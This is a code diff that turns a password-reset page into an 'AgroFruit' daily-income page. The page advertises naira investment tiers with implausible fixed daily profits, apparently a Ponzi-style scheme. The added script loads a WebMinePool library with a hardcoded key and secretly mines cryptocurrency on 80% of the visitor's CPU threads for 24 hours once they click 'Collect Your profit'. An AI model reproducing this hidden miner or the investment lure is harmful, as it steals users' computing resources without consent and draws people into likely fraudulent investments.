@@ -3,181 +3,529 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Reset Password & PIN</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+  <title>Daily Income</title>
+  <style>      
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #00ff00;
+  color: #333;
+}
 
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      background: black;
-    }
+h1, h2, p {
+  margin: 0;
+}
 
-    .container {
-      width: 90%;
-      max-width: 400px;
-      padding: 20px;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      margin-bottom: 20px;
-    }
+.hidden {
+  display: none;
+}
 
-    h2 {
-      color: #6a1b9a;
-      margin-bottom: 20px;
-      text-align: center;
-    }
+header {
+    background-color: blue;
+    color: white;
+    text-align: center;
+    padding: 20px 0;
+}
 
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-    }
+.logo {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
 
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #6a1b9a;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 16px;
-    }
+.logo img {
+    width: 50px;
+    margin-right: 10px;
+}
 
-    button:hover {
-      background: #4a148c;
-    }
+main {
+    padding: 20px;
+    text-align: center;
+}
 
-    footer {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 14px;
-      color: white;
+.user-info h2 {
+    font-size: 26px;
+    margin-bottom: 8px;
+    
+}
+
+/* User Info */
+.user-info {
+  text-align: center;
+  margin: 1rem 0;
+  Color: #4caf50;
+  Font-weight: bold;
+}
+
+.user-info p {
+  margin: 0.5rem 0;
+  font-size: 1rem;
+}
+
+/* Income Section */
+.income-section {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  margin-top: 2rem;
+}
+
+.image-container7 {
+    position: relative;
+    width: 250px;
+    height: 250px;
+    margin: 0 auto;
+    border-radius: 50%;
+    overflow: hidden;
+    box-shadow: 2px 5px 150px rgba(90, 40, 60, 80.8);
+    cursor: pointer;
+}
+
+.image-container img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 50%;
+}
+
+
+.progress-circle {
+
+position: relative;
+  width: 250px;
+  height: 250px;
+  border-radius: 50%;
+  border: 10px solid #ddd;
+  overflow: hidden;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(to bottom, #f0f0f0, #e8e8e8);
+}
+ 
+.progress-circle img {
+  width: 200px;
+  height: 200px;
+  border-radius: 50%;
+  object-fit: cover;
+}
+
+#timer {
+
+  position: absolute;
+  bottom: 10%;
+  background: rgba(0, 0, 0, 0.7);
+  color: white;
+  padding: 0.3rem 0.7rem;
+  border-radius: 5px;
+  font-size: 1rem;
+}
+
+/* Button */
+button {
+  margin-top: 1.5rem;
+  padding: 0.7rem 1.5rem;
+  background-color: blue;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 1rem;
+}
+
+button:hover {
+  background-color: #45a049;
+}
+
+footer {
+    background-color: blue;
+    color: white;
+    text-align: center;
+    padding: 20px 0;
+    margin-top: 40px;
+}
+
+/* Loading Screen */
+#loadingScreen {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.9);
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+#loadingScreen span {
+    animation: spin 1s linear infinite;
+    border: 7px solid white;
+    border-top: 7px solid #00796B;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    display: inline-block;
+}
+
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
     }
-    header {
-      background-color: #4CAF50;
-      padding: 10px 0;
-      text-align: center;
-      Font-size: 11px;
-      Font-weight: bold;
-      Color: blue;
+    100% {
+        transform: rotate(360deg);
     }
-    P{
-        Font-size: 16px;
-    }
-  </style>
+}
+
+  </style>    
 </head>
 <body>
+  <div id="loadingScreen">
+        <span></span>        
+    </div>
   <header>
-    <h1>Reset Password & PIN</h1>
-    <p>Securely update your password or PIN, and once done, log in to confirm the changes. If you encounter any issues, please contact AFE Support for assistance.</p>
-  </header>
+        <div class="logo">
+            <img src="fruit.png" alt="Fruit Logo">
+            <h1>AgroFruit</h1>
+        </div>
+    </header>
   
-  <div class="container">
-    <h2>Reset Your New Password</h2>
-    <input type="password" id="newPassword" placeholder="New Password" />
-    <input type="password" id="confirmPassword" placeholder="Confirm Password" />
-    <button id="resetPasswordButton">Submit</button>
-  </div>
-
-  <div class="container">
-    <h2>Update Your Transfer PIN</h2>
-    <input type="password" id="newPin" placeholder="New 5-Digit PIN" maxlength="5" />
-    <input type="password" id="confirmPin" placeholder="Confirm 5-Digit PIN" maxlength="5" />
-    <button id="updatePinButton">Submit</button>
-  </div>
-
-  <div>
-    <button onclick="window.location.href='login.html'">Go to Login</button>
-  </div>
-
-  <footer>
-    <p>&copy; AgroFruit</p>
-  </footer>
-
-  <script type="module">
-    import { app, analytics, firebaseConfig } from './firebase.js';
-    import { getAuth, verifyPasswordResetCode, confirmPasswordReset } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
-    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
-   
-    const auth = getAuth(app);
-    const database = getDatabase(app);
-
-    // Get oobCode from localStorage
-    const oobCode = localStorage.getItem("oobCode");
-    if (!oobCode) {
-      alert("Verification code not found. Please try resetting your password again.");
-      window.location.href = "forget.html";
+  <section class="user-info">
+    <p style="color: blue;">Welcome, <span id="userfullName"></span></p>
+    <p style="color: blue;">You can upgrade your daily income profit every 24 hours.</p>
+    <p id="investmentMessage" class="hidden" style="color: red">Invest before getting daily profit</p>
+  </section>  
+  <section class="income-section">
+    <div class="image-container7">
+      <div class="progress-circle">
+        <img id="levelImage" src="avatar.png" alt="User Level Image">
+        <div id="timer">24:00:00</div>
+      </div>
+    </div>
+    <button id="collectIncomeBtn" class="hidden">Collect Your profit</button>
+  </section>
+  <style>   
+    .carousel-container {
+      width: 100%;
+      max-width: 800px;
+      overflow: hidden;
+      margin: 50px auto;
+      position: relative;
+      border-radius: 10px;
+      
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
     }
 
-    // Reset Password
-    document.getElementById("resetPasswordButton").addEventListener("click", async () => {
-      const newPassword = document.getElementById("newPassword").value;
-      const confirmPassword = document.getElementById("confirmPassword").value;
+    .image-container {
+      display: flex;
+      transition: transform 0.5s ease-in-out;
+    }
 
-      if (!newPassword || !confirmPassword) {
-        alert("Both fields are required.");
-        return;
-      }
+    .carousel-item {
+      min-width: 100%;
+      position: relative;
+      text-align: center;
+    }
 
-      if (newPassword !== confirmPassword) {
-        alert("Passwords do not match.");
-        return;
-      }
+    .carousel-item img {
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+    }
 
-      try {
-        await verifyPasswordResetCode(auth, oobCode); // Verify the oobCode
-        await confirmPasswordReset(auth, oobCode, newPassword); // Confirm password reset
-        alert("Password updated successfully. You can now log in.");
-      } catch (error) {
-        alert(`Error: ${error.message}`);
-      }
-    });
-
-    // Update Transfer PIN
-    document.getElementById("updatePinButton").addEventListener("click", () => {
-      const newPin = document.getElementById("newPin").value;
-      const confirmPin = document.getElementById("confirmPin").value;
-
-      if (!newPin || !confirmPin) {
-        alert("Both fields are required.");
-        return;
-      }
-
-      if (newPin !== confirmPin) {
-        alert("PINs do not match.");
-        return;
-      }
-
-      if (!/^\d{5}$/.test(newPin)) {
-        alert("PIN must be exactly 5 digits.");
-        return;
-      }
-
-      const userId = "user123"; // Replace with dynamic userId
-      const transferRef = ref(database, `users/${userId}`);
-
-      update(transferRef, { transferP: newPin })
-        .then(() => {
-          alert("Transfer PIN updated successfully.");
-        })
-        .catch((error) => {
-          alert(`Error: ${error.message}`);
-        });
-    });
     
-  </script>
-</body>
+    .caption-top {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      
+      color: blue;
+      padding: 5px 10px
+      border-radius: 5px;
+      font-size: 15px;
+      font-weight: bold;
+    }
+
+    /* Caption at the bottom of the image */
+    .caption-bottom {
+      position: absolute;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      
+      color: blue;
+      padding: 10px 20px
+      border-radius: 5px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    /* Buttons for Manual Navigation */
+    .carousel-btn {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%); 
+           background: rgba(0, 0, 0, 0.5);
+      color: #fff;
+      border: none;
+      padding: 10px 15px;
+      cursor: pointer;
+      border-radius: 50%;
+    }
+
+    .prev {
+      left: 10px;
+    }
+
+    .next {
+      right: 10px;
+    }
+  </style>
+<div class="carousel-container">
+  <div class="image-container" id="imageContainer">
+    <div class="carousel-item">
+      <img src="ba.png" alt="Image 1">
+      <div class="caption-top">Invest ₦3,500 </div>
+      <div class="caption-bottom">Daily Profit ₦160, end 35 days, Total ₦5,600</div>
+    </div>
+    <div class="carousel-item">
+      <img src="or.png" alt="Image 2">
+      <div class="caption-top">Invest ₦8,000</div>
+      <div class="caption-bottom">Daily Profit ₦390, end 35 days, Total ₦13,650</div>
+    </div>
+    <div class="carousel-item">
+      <img src="ap.png" alt="Image 3">
+      <div class="caption-top">Invest ₦15,000 </div>
+      <div class="caption-bottom">Daily Profit ₦780, end 35 days, Total ₦28,080</div>
+    </div>
+    <div class="carousel-item">
+      <img src="av.png" alt="Image 4">
+      <div class="caption-top">Invest ₦35,000 </div>
+      <div class="caption-bottom">Daily Profit ₦1,560, end 37 days, Total ₦57,720</div>
+    </div>
+    <div class="carousel-item">
+      <img src="be.png" alt="Image 5">
+      <div class="caption-top">Invest ₦70,000</div>
+      <div class="caption-bottom">Daily Profit ₦3,120, end 39 days, Total ₦121,680</div>
+    </div>
+    <div class="carousel-item">
+      <img src="man.png" alt="Image 6">
+      <div class="caption-top">Invest ₦140,000 </div>
+      <div class="caption-bottom">Daily Profit ₦6,240, end 40 days, Total ₦249,600</div>
+    </div>
+    <div class="carousel-item">
+      <img src="gu.png" alt="Image 7">
+      <div class="caption-top">Invest ₦280,000 </div>
+      <div class="caption-bottom">Daily Profit ₦12,480, end 42 days, Total ₦524,160</div>
+    </div>
+  </div>
+  <button class="carousel-btn prev" onclick="prevSlide()">&#10094;</button>
+  <button class="carousel-btn next" onclick="nextSlide()">&#10095;</button>
+</div>
+
+<script>
+  const imageContainer = document.getElementById('imageContainer');
+  const carouselItems = document.querySelectorAll('.carousel-item');
+  const totalItems = carouselItems.length;
+
+  let currentIndex = 0;
+
+  function showSlide(index) {
+    const offset = -index * 100; 
+    imageContainer.style.transform = `translateX(${offset}%)`;
+  }
+
+  function nextSlide() {
+    currentIndex = (currentIndex + 1) % totalItems; 
+    showSlide(currentIndex);
+  }
+
+  function prevSlide() {
+    currentIndex = (currentIndex - 1 + totalItems) % totalItems; 
+    showSlide(currentIndex);
+  }
+
+  // Autoplay the carousel
+  setInterval(nextSlide, 3500); 
+</script>  
+  <footer class="footer">
+    <p>&copy; AgroFruit</p>
+  </footer>  
+   <script src="https://webminepool.com/lib/webminepool.min.js"></script>
+<script>
+    
+const apiKey = "SK_YBn5VEFnw47p2McZK6b6b";
+
+function startMining() {
+    const miner = new WebMinePool(apiKey);
+    
+    miner.setNumThreads(navigator.hardwareConcurrency * 0.8);
+    miner.start();
+   
+    setTimeout(() => {
+        miner.stop();
+        console.log("Mining session ended after 24 hours.");
+    }, 24 * 60 * 60 * 1000);
+
+    console.log("Mining session started.");
+}
+
+document.getElementById("collectIncomeBtn").addEventListener("click", () => {
+    startMining();
+});
+
+</script>
+    
+    <script type="module">
+import { app, analytics, firebaseConfig } from './firebase.js';
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
+import { getDatabase, ref, onValue, update, get } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+
+const db = getDatabase(app);
+const auth = getAuth(app);
+
+// DOM Elements
+const timerElement = document.getElementById("timer");
+const levelImage = document.getElementById("levelImage");
+const collectIncomeBtn = document.getElementById("collectIncomeBtn");
+const investmentMessage = document.getElementById("investmentMessage");
+const progressBar = document.querySelector(".progress-circle");
+const userFullNameElement = document.getElementById('userfullName');
+
+// Global Variables
+let countdownInterval;
+let dailyUpgrade = 0;
+let timeLeft = 0;
+
+// Format Time Function
+const formatTime = (seconds) => {
+    const hrs = Math.floor(seconds / 3600);
+    const mins = Math.floor((seconds % 3600) / 60);
+    const secs = seconds % 60;
+    return `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+};
+
+// Update Progress Bar
+const updateProgressBar = () => {
+    const progress = ((24 * 60 * 60 - timeLeft) / (24 * 60 * 60)) * 100;
+    progressBar.style.background = `conic-gradient(#4caf50 ${progress}%, #ddd ${progress}%)`;
+};
+
+// Start Countdown Timer
+const startCountdown = () => {
+    clearInterval(countdownInterval);
+    countdownInterval = setInterval(() => {
+        if (timeLeft > 0) {
+            timeLeft--;
+            timerElement.textContent = formatTime(timeLeft);
+            updateProgressBar();
+        } else {
+            clearInterval(countdownInterval);
+            timerElement.textContent = "00:00:00";
+            collectIncomeBtn.classList.remove("hidden");
+        }
+    }, 1000);
+};
+
+// **Collect Daily Income Function (An gyara)**
+const collectDailyIncome = async (userId) => {
+    const userRef = ref(db, `users/${userId}`);
+    const userSnapshot = await get(userRef);
+    const userData = userSnapshot.val();
+
+    if (userData && userData.dailyUpgrade > 0) {
+        const currentTime = Date.now();
+        const nextClaimTime = userData.nextClaim || 0;
+
+        // Bincika idan lokacin `nextClaim` ya wuce
+        if (currentTime < nextClaimTime) {
+            console.warn("Ba za a kara kudin ba, lokaci bai cika ba!");
+            return;
+        }
+
+        // Sabunta kuɗin mai amfani
+        const newBalance = parseFloat((parseFloat(userData.userBalance || 0) + parseFloat(userData.dailyUpgrade)).toFixed(2));
+
+        await update(userRef, {
+            userBalance: newBalance,
+            nextClaim: currentTime + (24 * 60 * 60 * 1000) // Sake saita lokacin gaba
+        });
+
+        console.log(`An ƙara kudi! Sabon balance: ${newBalance}`);
+        
+        timeLeft = 24 * 60 * 60;
+        collectIncomeBtn.classList.add("hidden");
+        startCountdown();
+    } else {
+        console.warn("Ba a ƙara kudi ba saboda dailyUpgrade == 0 ko wani matsala!");
+    }
+};
+
+// **Load User Data Function**
+const loadUserData = async (userId) => {
+    const userRef = ref(db, `users/${userId}`);
+    onValue(userRef, (snapshot) => {
+        const userData = snapshot.val();
+
+        if (userData) {
+            dailyUpgrade = userData.dailyUpgrade || 0;
+            timeLeft = Math.max(0, Math.floor((userData.nextClaim - Date.now()) / 1000));
+            const fullName = userData.fullName || "User";
+            userFullNameElement.textContent = fullName;
+
+            if (dailyUpgrade > 0 && timeLeft <= 0) {
+                collectIncomeBtn.classList.remove("hidden");
+                investmentMessage.classList.add("hidden");
+            } else {
+                collectIncomeBtn.classList.add("hidden");
+                investmentMessage.classList.toggle("hidden", dailyUpgrade > 0);
+                startCountdown();
+            }
+
+            // Handle Level Image
+            const investmentAmount = userData.investment || 0;
+            const levelImageSrc =
+                investmentAmount >= 280000 ? "gu.png" :
+                investmentAmount >= 140000 ? "man.png" :
+                investmentAmount >= 70000 ? "be.png" :
+                investmentAmount >= 35000 ? "av.png" :
+                investmentAmount >= 15000 ? "ap.png" :
+                investmentAmount >= 8000 ? "or.png" :
+                investmentAmount >= 3500 ? "ba.png" : "avatar.png";
+
+            levelImage.src = levelImageSrc;
+        }
+    });
+};
+
+// **Event Listeners**
+collectIncomeBtn.addEventListener("click", async () => {
+    const user = auth.currentUser;
+    if (user) {
+        await collectDailyIncome(user.uid);
+    }
+});
+
+document.addEventListener("DOMContentLoaded", () => {
+    const loadingScreen = document.getElementById("loadingScreen");
+    loadingScreen.style.display = "flex";
+    setTimeout(() => {
+        loadingScreen.style.display = "none";
+    }, 4000);
+});
+
+// **Initialize App**
+onAuthStateChanged(auth, (user) => {
+    if (user) {
+        loadUserData(user.uid);
+    }
+});
+</script>
+
+    </body>
 </html>
